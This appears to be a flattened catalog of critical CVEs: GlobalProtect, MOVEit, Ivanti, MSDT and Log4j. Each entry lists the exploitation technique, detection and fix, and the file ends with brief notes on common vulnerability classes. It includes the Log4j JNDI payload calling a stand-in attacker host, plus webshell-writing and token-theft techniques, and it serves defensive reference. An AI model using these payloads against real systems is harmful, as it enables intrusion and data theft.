_note: High-value CVE catalog. Long-tail: specific exploitation details not in generic LLM training.

critical_cves.description: Command injection in GlobalProtect feature. Unauthenticated attacker creates arbitrary files on firewall, escalating to OS command execution.
critical_cves.exploitation_technique: HTTP request with crafted SESSID cookie containing path traversal to write PHP webshell
critical_cves.detection: Look for unexpected files in /var/appweb/htdocs/ or access to /global-protect/ with non-standard cookies
critical_cves.fix: Patch to fixed version; disable GlobalProtect if not needed; enable Threat Prevention to detect early

critical_cves.description: Allows unauthenticated attacker to read memory contents from appliance, leaking session tokens. Active exploitation by ransomware groups.
critical_cves.exploitation_technique: HTTP GET to /oauth/idp/.well-known/openid-configuration returns memory contents including session tokens; attacker authenticates with stolen token
critical_cves.detection: Unusual session activity; connections from unexpected IPs using valid session tokens; SIEM alert for token reuse from multiple IPs
critical_cves.fix: Immediate patch; terminate all active sessions after patching; audit for prior compromise

critical_cves.description: SQL injection in MOVEit Transfer HTTP endpoint. Cl0p ransomware gang exploited before patch was available (zero-day). Led to 2,000+ organization breaches.
critical_cves.exploitation_scale: 2,000+ organizations breached; data of 16 million+ individuals exposed
critical_cves.fix: Patch immediately; check for unauthorized LEMURLOOT webshell; review azureedge.net traffic

critical_cves.description: Command injection in web component. Chained with CVE-2023-46805 (authentication bypass) for unauthenticated RCE.
critical_cves.affected: Ivanti Connect Secure and Policy Secure all versions
critical_cves.chain_exploit: CVE-2023-46805 (auth bypass) + CVE-2024-21887 (command injection) = unauthenticated RCE
critical_cves.cisa_action: Emergency Directive ED-24-01: Disconnect within 48 hours, factory reset before reconnect

critical_cves.type: Remote Code Execution via Microsoft Support Diagnostic Tool
critical_cves.description: Office documents calling MSDT protocol handler executes code without macros. Bypasses macro restrictions.
critical_cves.exploitation_technique: Word document with external OLE link to attacker-controlled HTML invoking ms-msdt:// URI scheme
critical_cves.notable_because: Bypassed decades of macro-blocking defense; works without enabling macros
critical_cves.detection: MSDT.exe with unusual parent process (winword.exe, excel.exe); sdiagnhost.exe spawning child processes

critical_cves.type: Remote Code Execution via JNDI Injection
critical_cves.description: JNDI injection via log messages. Attacker sends ${jndi:ldap://attacker.com/exploit} in any logged field; Log4j fetches and executes remote class.
critical_cves.affected: Log4j2 2.0-2.14.1 (core of Java ecosystem; affected VMware, Apple, Amazon, Google, Twitter etc.)
critical_cves.historical_significance: Considered worst vulnerability of the decade; 10.0 CVSS; patched in days but deployment took months
critical_cves.detection: ${jndi:} pattern in any log field; DNS lookups to external hosts from Java applications; unusual LDAP/RMI outbound connections

sql_injection.description: Attacker inserts SQL commands into input fields
sql_injection.impact: Data theft, auth bypass, RCE (via xp_cmdshell on MSSQL)

command_injection.description: User input passed to OS shell without sanitization
command_injection.impact: OS command execution with application privilege
prevention: Never pass user input to shell

ssrf_server_side_request_forgery.description: Server makes HTTP requests to attacker-specified URL
ssrf_server_side_request_forgery.impact: Internal network access; cloud metadata theft (AWS IMDSv1: 169.254.169.254)
prevention: Block internal IP ranges from user-specified URLs

xxe_external_entity.description: XML parser processes external entity references
xxe_external_entity.impact: File read, SSRF, RCE in severe cases
prevention: Disable external entities in XML parser
